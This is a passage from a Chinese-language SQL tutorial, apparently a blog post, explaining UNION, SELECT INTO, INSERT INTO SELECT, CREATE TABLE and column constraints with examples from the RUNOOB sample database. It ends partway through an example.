<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country, <span class="keyword">name</span> <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country, app_name <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/AAA99C7B-36A5-43FB-B489-F8CE63B62C71.jpg)</p>
<p>使用UNION命令时需要注意，只能在最后使用一个ORDER BY命令，是将两个查询结果合在一起之后，再进行排序！绝对不能写两个ORDER BY命令。</p>
<p>另外，在使用ORDER BY排序时，注意两个结果的别名保持一致，使用别名排序很方便。当然也可以使用列数。</p>
<p>ORDER BY 除了可以对指定的字段进行排序，还可以使用函数进行排序:</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="title">by</span> abs(a);</span><br></pre></td></tr></table></figure>

<h4 id="SQL-SELECT-INTO-语句"><a href="#SQL-SELECT-INTO-语句" class="headerlink" title="SQL SELECT INTO 语句"></a>SQL SELECT INTO 语句</h4><p>SELECT INTO 语句从一个表复制数据，然后把数据插入到另一个新表中。</p>
<p><strong>注意：</strong></p>
<p>MySQL 数据库不支持 SELECT … INTO 语句，但支持 INSERT INTO … SELECT 。</p>
<p>当然你可以使用以下语句来拷贝表结构及数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 新表</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 旧表</span><br></pre></td></tr></table></figure>

<p>SQL SELECT INTO 语法</p>
<p>我们可以复制所有的列插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line"><span class="keyword">INTO</span> newtable [<span class="keyword">IN</span> externaldb]</span><br><span class="line"><span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p>或者只复制希望的列插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">INTO</span> newtable [<span class="keyword">IN</span> externaldb]</span><br><span class="line"><span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong>新表将会使用 SELECT 语句中定义的列名称和类型进行创建。您可以使用 AS 子句来应用新名称。</p>
<p>SQL SELECT INTO 实例</p>
<p>创建 Websites 的备份复件：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>只复制一些列插入到新表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">url</span></span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>只复制中国的网站插入到新表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>复制多个表中的数据插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id;</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong>SELECT INTO 语句可用于通过另一种模式创建一个新的空表。只需要添加促使查询没有数据返回的 WHERE 子句即可：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> newtable</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span>=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INSERT-INTO-SELECT-语句"><a href="#SQL-INSERT-INTO-SELECT-语句" class="headerlink" title="SQL INSERT INTO SELECT 语句"></a>SQL INSERT INTO SELECT 语句</h4><p>INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。目标表中任何已存在的行都不会受影响。</p>
<p>SQL INSERT INTO SELECT 语法</p>
<p>我们可以从一个表中复制所有的列插入到另一个已存在的表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table2</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p>或者我们可以只复制希望的列插入到另一个已存在的表中：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table2</span><br><span class="line">(<span class="name">column_name</span>(<span class="name">s</span>))</span><br><span class="line">SELECT column_name(<span class="name">s</span>)</span><br><span class="line">FROM table1<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “apps” APP 的数据：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM apps;</span><br><span class="line"><span class="code">+----+</span>------------<span class="code">+-------------------------+</span>---------+</span><br><span class="line">| id | app<span class="emphasis">_name   | url                     | country |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">|  1 | QQ APP     | http://im.qq.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  2 | 微博 APP | http://weibo.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>SQL INSERT INTO SELECT 实例</p>
<p>复制 “apps” 中的数据插入到 “Websites” 中：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, country)</span><br><span class="line"><span class="keyword">SELECT</span> app_name, country <span class="keyword">FROM</span> apps;</span><br></pre></td></tr></table></figure>

<p>只复 QQ 的 APP 到 “Websites” 中：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, country)</span><br><span class="line"><span class="keyword">SELECT</span> app_name, country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>select into from 和 insert into select 都是用来复制表</p>
<p>两者的主要区别为： <strong>select  into … from</strong> 要求目标表不存在，因为在插入时会自动创建；<strong>insert into … select from</strong> 要求目标表存在。</p>
<p>\1. 复制表结构及其数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old</span><br></pre></td></tr></table></figure>

<p>\2. 只复制表结构：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old <span class="keyword">where</span> <span class="number">1</span>=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">table</span> table_name_new <span class="comment">like table_name_old</span></span><br></pre></td></tr></table></figure>

<p>\3. 只复制表数据：</p>
<p>如果两个表结构一样：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_name_new <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old</span><br></pre></td></tr></table></figure>

<p>如果两个表结构不一样：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert <span class="keyword">into</span> table_name_new(column1,column2<span class="params">...</span>) <span class="keyword">select</span> column1,column2<span class="params">...</span> from table_name_old</span><br></pre></td></tr></table></figure>

<h4 id="SQL-CREATE-DATABASE-语句"><a href="#SQL-CREATE-DATABASE-语句" class="headerlink" title="SQL CREATE DATABASE 语句"></a>SQL CREATE DATABASE 语句</h4><p>CREATE DATABASE 语句用于创建数据库。</p>
<p>SQL CREATE DATABASE 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> dbname;</span><br></pre></td></tr></table></figure>

<p>SQL CREATE DATABASE 实例</p>
<p>下面的 SQL 语句创建一个名为 “my_db” 的数据库：</p>
<p>CREATE DATABASE my_db;</p>
<p>数据库表可以通过 CREATE TABLE 语句来添加。</p>
<h4 id="SQL-CREATE-TABLE-语句"><a href="#SQL-CREATE-TABLE-语句" class="headerlink" title="SQL CREATE TABLE 语句"></a>SQL CREATE TABLE 语句</h4><p>CREATE TABLE 语句用于创建数据库中的表。</p>
<p>表由行和列组成，每个表都必须有个表名</p>
<p>SQL CREATE TABLE 语法</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(<span class="name">size</span>),</span><br><span class="line">column_name2 data_type(<span class="name">size</span>),</span><br><span class="line">column_name3 data_type(<span class="name">size</span>),</span><br><span class="line">....</span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>column_name 参数规定表中列的名称。</p>
<p>data_type 参数规定列的数据类型（例如 varchar、integer、decimal、date 等等）。</p>
<p>size 参数规定表中列的最大长度。</p>
<p><strong>提示：</strong>如需了解 MS Access、MySQL 和 SQL Server 中可用的数据类型，请访问我们完整的 <a href="https://www.runoob.com/sql/sql-datatypes.html" target="_blank" rel="noopener">数据类型参考手册</a>。</p>
<p>SQL CREATE TABLE 实例</p>
<p>现在我们想要创建一个名为 “Persons” 的表，包含五列：PersonID、LastName、FirstName、Address 和 City。</p>
<p>我们使用下面的 CREATE TABLE 语句：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">PersonID int,</span><br><span class="line">LastName varchar(255),</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>PersonID 列的数据类型是 int，包含整数。</p>
<p>LastName、FirstName、Address 和 City 列的数据类型是 varchar，包含字符，且这些字段的最大长度为 255 个字符。</p>
<p>空的 “Persons” 表如下所示：</p>
<table>
<thead>
<tr>
<th align="left">PersonID</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>提示：</strong>可使用 INSERT INTO 语句向空表写入数据。</p>
<h4 id="SQL-约束（Constraints）"><a href="#SQL-约束（Constraints）" class="headerlink" title="SQL 约束（Constraints）"></a>SQL 约束（Constraints）</h4><p>SQL 约束用于规定表中的数据规则。</p>
<p>如果存在违反约束的数据行为，行为会被约束终止。</p>
<p>约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）。</p>
<p>SQL CREATE TABLE + CONSTRAINT 语法</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">column_name2 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">column_name3 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">....</span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>在 SQL 中，我们有如下约束：</p>
<ul>
<li><strong>NOT NULL</strong> - 指示某列不能存储 NULL 值。</li>
<li><strong>UNIQUE</strong> - 保证某列的每行必须有唯一的值。</li>
<li><strong>PRIMARY KEY</strong> - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</li>
<li><strong>FOREIGN KEY</strong> - 保证一个表中的数据匹配另一个表中的值的参照完整性。</li>
<li><strong>CHECK</strong> - 保证列中的值符合指定的条件。</li>
<li><strong>DEFAULT</strong> - 规定没有给列赋值时的默认值。</li>
</ul>
<p>在下面的章节，我们会详细讲解每一种约束。</p>
<p>PRIMARY KEY 约束的实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (Id_P)  //PRIMARY <span class="keyword">KEY</span>约束</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span>,   //PRIMARY <span class="keyword">KEY</span>约束</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-NOT-NULL-约束"><a href="#SQL-NOT-NULL-约束" class="headerlink" title="SQL NOT NULL 约束"></a>SQL NOT NULL 约束</h4><p>NOT NULL 约束强制列不接受 NULL 值。</p>
<p>NOT NULL 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</p>
<p>下面的 SQL 强制 “P_Id” 列和 “LastName” 列不接受 NULL 值：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>删除表的字段的 not null 约束：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> x <span class="keyword">modify</span> column_name <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> x <span class="keyword">modify</span> column_name <span class="keyword">not</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-UNIQUE-约束"><a href="#SQL-UNIQUE-约束" class="headerlink" title="SQL UNIQUE 约束"></a>SQL UNIQUE 约束</h4><p>UNIQUE 约束唯一标识数据库表中的每条记录。</p>
<p>UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。</p>
<p>PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。</p>
<p>请注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。</p>
<p>CREATE TABLE 时的 SQL UNIQUE 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 UNIQUE 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">UNIQUE (P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> UNIQUE,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>uc_PersonID</strong> 是一个约束名 ！上面建的是唯一约束，为了方便区别约束名一般起得有规律点比如 UC（就是 UNIQUE CONSTRAINT 的缩写意思是唯一约束） uc_PersonID 就是对表中的PersonID 建唯一约束，强制约束 Id_P 和 LastName 唯一。</p>
<p>ALTER TABLE 时的 SQL UNIQUE 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 UNIQUE 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> (P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> uc_PersonID <span class="keyword">UNIQUE</span> (P_Id,LastName)</span><br></pre></td></tr></table></figure>

<p>撤销 UNIQUE 约束</p>
<p>如需撤销 UNIQUE 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> uc_PersonID</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> uc_PersonID</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb2(</span><br><span class="line">    tb2_id <span class="built_in">int</span> <span class="keyword">unique</span>,</span><br><span class="line">    tb2_name <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    tb2_age <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">unique</span>(tb2_name)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb2;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb2(tb2_id,tb2_name,tb2_age) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">'张三'</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb2 <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">'张三'</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--建表时，创建约束，有约束名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb3(</span><br><span class="line">    tb3_id <span class="built_in">int</span> ,</span><br><span class="line">    tb3_name <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    tb3_age <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">constraint</span> no_id <span class="keyword">unique</span> (tb3_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">'张三'</span>,<span class="number">20</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3(tb3_id,tb3_age) <span 